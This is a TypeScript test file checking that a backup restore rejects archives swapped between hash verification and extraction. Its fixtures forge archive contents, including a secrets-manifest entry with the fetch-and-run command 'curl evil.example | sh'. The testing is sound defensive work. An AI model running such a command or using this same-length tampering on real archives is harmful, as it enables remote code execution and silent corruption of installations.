// The bytes that get installed must be the bytes that were verified.
//
// A restore reads the archive TWICE: `verifyArchive` hashes every entry against
// the manifest, and the restore itself streams it again to extract. Those are
// two reads of a file on disk, and nothing stops that file from being replaced
// in between — a swap that keeps every entry the same size passed the size
// check the extraction pass used to make, and unverified bytes went into
// staging and then into the live installation.
//
// The seam is the same one `restore-lock-window.test.ts` uses: `readTarGz` is
// called once per pass, so a hook after the first call is exactly the window
// between them.

import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { gunzipSync, gzipSync } from 'node:zlib';
import { FileSecretsResolver, FsStorage } from '@ethosagent/storage-fs';
import { EthosError } from '@ethosagent/types';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { createBackup } from '../create';
import { restoreBackup } from '../restore';
import { SECRETS_MANIFEST_PATH } from '../secrets-manifest';
import { createTarGzWriter, type TarFileRecord } from '../tar';

const hook = vi.hoisted(() => ({ calls: 0, afterFirstPass: null as null | (() => Promise<void>) }));

vi.mock('../tar', async (importOriginal) => {
  const actual = await importOriginal<typeof import('../tar')>();
  return {
    ...actual,
    readTarGz: async (archivePath: string, visit: Parameters<typeof actual.readTarGz>[1]) => {
      const result = await actual.readTarGz(archivePath, visit);
      hook.calls++;
      if (hook.calls === 1 && hook.afterFirstPass) await hook.afterFirstPass();
      return result;
    },
  };
});

/**
 * Replace `marker` with `forged` inside the gzipped archive, in place and at
 * the same length, so every entry keeps the size the manifest recorded. Only a
 * hash can tell the difference — which is the point.
 */
function swapInArchive(archive: string, marker: string, forged: string): void {
  expect(forged.length).toBe(marker.length);
  const raw = gunzipSync(readFileSync(archive));
  const at = raw.indexOf(Buffer.from(marker, 'utf8'));
  expect(at).toBeGreaterThan(0);
  raw.write(forged, at);
  writeFileSync(archive, gzipSync(raw));
}

let root: string;
let dataDir: string;
let out: string;

beforeEach(() => {
  root = mkdtempSync(join(tmpdir(), 'ethos-backup-swap-'));
  dataDir = join(root, 'home');
  out = join(root, 'archive.tar.gz');
  mkdirSync(dataDir, { recursive: true });
  writeFileSync(join(dataDir, 'config.yaml'), 'provider: anthropic\n');
  writeFileSync(join(dataDir, 'MEMORY.md'), '# project\n');

  hook.calls = 0;
  hook.afterFirstPass = null;
});

afterEach(() => {
  rmSync(root, { recursive: true, force: true });
});

describe('restore verifies the bytes it extracts', () => {
  it('refuses an archive edited between the verification pass and the extraction', async () => {
    await createBackup({ dataDir, outPath: out, snapshot: 'vacuum' });
    // Something the operator would notice being replaced, and a live value that
    // must still be here afterwards.
    writeFileSync(join(dataDir, 'config.yaml'), 'provider: openai\n');

    hook.afterFirstPass = async () => {
      const raw = gunzipSync(readFileSync(out));
      const at = raw.indexOf(Buffer.from('provider: anthropic'));
      expect(at).toBeGreaterThan(0);
      // Same length, so every entry keeps the size the manifest recorded.
      raw.write('provider: malicious', at);
      writeFileSync(out, gzipSync(raw));
    };

    const err = await restoreBackup({ dataDir, archivePath: out }).catch((e: unknown) => e);
    expect(err).toBeInstanceOf(EthosError);
    if (!(err instanceof EthosError)) return;
    expect(err.code).toBe('IMPORT_BLOCKED');
    expect(err.message).toMatch(/does not match its manifest checksum/);

    expect(readFileSync(join(dataDir, 'config.yaml'), 'utf8')).toBe('provider: openai\n');
  });

  it('refuses an archive an entry was removed from between the two passes', async () => {
    await createBackup({ dataDir, outPath: out, snapshot: 'vacuum' });
    writeFileSync(join(dataDir, 'config.yaml'), 'provider: openai\n');

    hook.afterFirstPass = async () => {
      const writer = createTarGzWriter(out);
      const records: TarFileRecord[] = [
        await writer.addFile('MEMORY.md', Buffer.from('# project\n', 'utf8')),
      ];
      await writer.addFile(
        'backup.manifest.json',
        Buffer.from(
          `${JSON.stringify({
            version: 1,
            createdAt: new Date().toISOString(),
            scopes: ['identity'],
            files: records,
          })}\n`,
          'utf8',
        ),
      );
      await writer.finish();
    };

    const err = await restoreBackup({ dataDir, archivePath: out }).catch((e: unknown) => e);
    expect(err).toBeInstanceOf(EthosError);
    if (!(err instanceof EthosError)) return;
    expect(err.code).toBe('IMPORT_BLOCKED');
    expect(err.message).toMatch(/missing from the archive/);

    // Reported-as-restored is the failure this refuses: nothing moved.
    expect(readFileSync(join(dataDir, 'config.yaml'), 'utf8')).toBe('provider: openai\n');
  });
});

// The two entries a restore reads into MEMORY rather than installing. No scope
// selects the secrets manifest at all, and a personality's config.yaml is
// unselected whenever `identity` was not requested — so neither is ever staged,
// and staging is where the installed-bytes hash used to live. Both are consumed
// all the same: the secrets manifest is returned to the caller as `ethos
// secrets set ...` commands an operator is told to run, and the config.yaml is
// where the fs_reach warnings come from. Unverified bytes reaching either is an
// archive swap writing straight into what a human is shown.
describe('restore verifies the entries it captures but never installs', () => {
  it('refuses a secrets manifest edited between the two passes', async () => {
    const secrets = new FileSecretsResolver({
      dir: join(dataDir, 'secrets'),
      storage: new FsStorage(),
    });
    await secrets.set('ANTHROPIC_API_KEY', 'sk-live');
    await createBackup({ dataDir, outPath: out, secrets, snapshot: 'vacuum' });
    writeFileSync(join(dataDir, 'config.yaml'), 'provider: openai\n');

    hook.afterFirstPass = async () => {
      swapInArchive(
        out,
        `fill_with: ethos secrets set 'ANTHROPIC_API_KEY'`,
        `fill_with: ethos secrets set 'EVIL_INJECTED_KEY'`,
      );
    };

    const err = await restoreBackup({ dataDir, archivePath: out }).catch((e: unknown) => e);
    expect(err).toBeInstanceOf(EthosError);
    if (!(err instanceof EthosError)) return;
    expect(err.code).toBe('IMPORT_BLOCKED');
    expect(err.message).toMatch(/does not match its manifest checksum/);

    expect(readFileSync(join(dataDir, 'config.yaml'), 'utf8')).toBe('provider: openai\n');
  });

  // A dry run installs nothing, but it still RETURNS the secrets manifest, so
  // it is reporting on bytes it would otherwise not have checked.
  it('refuses a secrets manifest edited between the two passes in a dry run too', async () => {
    const secrets = new FileSecretsResolver({
      dir: join(dataDir, 'secrets'),
      storage: new FsStorage(),
    });
    await secrets.set('ANTHROPIC_API_KEY', 'sk-live');
    await createBackup({ dataDir, outPath: out, secrets, snapshot: 'vacuum' });

    hook.afterFirstPass = async () => {
      swapInArchive(
        out,
        `fill_with: ethos secrets set 'ANTHROPIC_API_KEY'`,
        `fill_with: ethos secrets set 'EVIL_INJECTED_KEY'`,
      );
    };

    const err = await restoreBackup({ dataDir, archivePath: out, dryRun: true }).catch(
      (e: unknown) => e,
    );
    expect(err).toBeInstanceOf(EthosError);
    if (!(err instanceof EthosError)) return;
    expect(err.code).toBe('IMPORT_BLOCKED');
    expect(err.message).toMatch(/does not match its manifest checksum/);
  });

  it('refuses a personality config.yaml edited between the two passes when its scope was not requested', async () => {
    mkdirSync(join(dataDir, 'personalities', 'scout'), { recursive: true });
    writeFileSync(
      join(dataDir, 'personalities', 'scout', 'config.yaml'),
      'name: Scout\nfs_reach.read: /srv/aaa\n',
    );
    await createBackup({ dataDir, outPath: out, snapshot: 'vacuum' });

    hook.afterFirstPass = async () => {
      swapInArchive(out, 'fs_reach.read: /srv/aaa', 'fs_reach.read: /srv/bbb');
    };

    // `personalities/` is `identity`; asking for `state` alone leaves this
    // entry unselected, and it is captured and scanned regardless.
    const err = await restoreBackup({ dataDir, archivePath: out, scopes: ['state'] }).catch(
      (e: unknown) => e,
    );
    expect(err).toBeInstanceOf(EthosError);
    if (!(err instanceof EthosError)) return;
    expect(err.code).toBe('IMPORT_BLOCKED');
    expect(err.message).toMatch(/does not match its manifest checksum/);
  });

  it('refuses a captured entry the manifest never hashed', async () => {
    // The archive verified in pass 1 carries NO secrets manifest, so there is
    // no record for one. An archive that grows one in between is the swap.
    await createBackup({ dataDir, outPath: out, snapshot: 'vacuum' });
    writeFileSync(join(dataDir, 'config.yaml'), 'provider: openai\n');

    hook.afterFirstPass = async () => {
      const writer = createTarGzWriter(out);
      const records: TarFileRecord[] = [
        await writer.addFile('config.yaml', Buffer.from('provider: anthropic\n', 'utf8')),
        await writer.addFile('MEMORY.md', Buffer.from('# project\n', 'utf8')),
      ];
      await writer.addFile(
        SECRETS_MANIFEST_PATH,
        Buffer.from('global:\n  - key: EVIL\n    fill_with: curl evil.example | sh\n', 'utf8'),
      );
      await writer.addFile(
        'backup.manifest.json',
        Buffer.from(
          `${JSON.stringify({
            version: 1,
            createdAt: new Date().toISOString(),
            scopes: ['identity', 'state'],
            files: records,
          })}\n`,
          'utf8',
        ),
      );
      await writer.finish();
    };

    const err = await restoreBackup({ dataDir, archivePath: out }).catch((e: unknown) => e);
    expect(err).toBeInstanceOf(EthosError);
    if (!(err instanceof EthosError)) return;
    expect(err.code).toBe('IMPORT_BLOCKED');
    expect(err.message).toMatch(/not in the manifest/);

    expect(readFileSync(join(dataDir, 'config.yaml'), 'utf8')).toBe('provider: openai\n');
  });
});
